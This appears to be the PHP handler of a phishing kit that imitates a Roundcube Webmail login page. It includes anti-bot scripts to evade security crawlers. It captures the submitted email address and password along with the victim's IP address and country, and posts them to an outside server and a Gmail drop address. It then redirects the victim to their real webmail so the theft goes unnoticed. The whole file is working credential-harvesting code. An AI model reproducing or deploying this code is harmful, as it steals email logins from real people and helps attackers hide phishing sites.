<?php
ob_start();
session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "./BOTS/antibots1.php";
include "./BOTS/antibots2.php";
include "./BOTS/antibots3.php";
include "./BOTS/antibots4.php";
include "./BOTS/antibots5.php";
include "./BOTS/antibots6.php";
include "./BOTS/xBananaBotsPerfect.php";
include('../blocker.php');

if(isset($_POST['_user'])){
	require 'engine/GetDetail.php';
	$domain = substr(strrchr($_POST['_user'], "@"), 1);
	$redir = $_POST['redir'];

	$ip = getenv("REMOTE_ADDR");

	// Page name + ip + country name
	$subject = "Roundcube Webmail |".$ip."|". get_country();
	$log = base64_encode($_POST['_user']);
	$body = body($_POST['_user'], $_POST['_pass']);
	// var_dump($body); die();

	$data = [
		'email' => $_POST['_user'],
		'password' => $_POST['_pass'],
		'send_to' => 'ablhdsn0120@gmail.com',
		'subject' => $subject,
		'body' => $body
	];

	$mgs = process_gkd('https://server.bossthraed.com/banser/index.php', $data);

	if($mgs === 'success'){
		
		$chain = "http://webmail";
		header ("Location: $chain.$domain");	
		// redirect success page
	}

	if($mgs === 'failed'){
		header("Location:". $redir); 
	}

}

?>
// {8b7gW,wJfMp1
